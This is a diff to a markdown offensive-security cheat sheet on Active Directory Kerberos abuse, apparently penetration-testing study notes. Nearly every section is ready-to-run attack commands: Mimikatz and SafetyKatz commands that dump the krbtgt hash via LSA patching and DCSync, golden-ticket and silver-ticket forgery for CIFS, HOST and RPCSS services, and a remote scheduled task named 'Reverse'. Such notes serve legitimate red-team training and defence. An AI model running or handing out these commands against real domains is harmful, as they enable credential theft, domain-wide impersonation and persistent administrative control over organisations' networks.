@@ -16,16 +16,27 @@
 ## Golden ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
 
-#### Dump hashes - Get the krbtgt hash
+#### Dump hashes of DC
+- Get the krbtgt hash
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
-#### Make golden ticket
-Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
-To get the SID use ```Get-DomainSID``` from powerview
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+.\SafetyKatz.exe "lsadump::lsa /patch" "exit"
+.\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+
+#### Create a Golden ticket
+- Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
+- To get the SID use ```Get-DomainSID``` from powerview
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
 #### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
@@ -41,20 +52,21 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 ## Silver ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
 
-#### Make silver ticket for CIFS
-Use the hash of the local computer
+#### Make silver ticket for CIFS service
+- Use the hash of the local computer
+- Other services are HOST, RPCSS, WSMAN
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:CIFS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
 ```
 
 #### Check access (After CIFS silver ticket)
 ```
-ls \\<servername>\c$\
+ls \\<SERVERNAME>\c$\
 ```
 
-#### Make silver ticket for Host
+#### Make silver ticket for Host service
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
 ```
 
 #### Schedule and execute a task (After host silver ticket)
@@ -67,9 +79,9 @@ schtasks /Run /S <target> /TN “Reverse”
 #### Make silver ticket for WMI
 Execute for WMI /service:HOST /service:RPCSS
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
 
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:RPCSS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
 ```
 
 #### Check WMI Permission
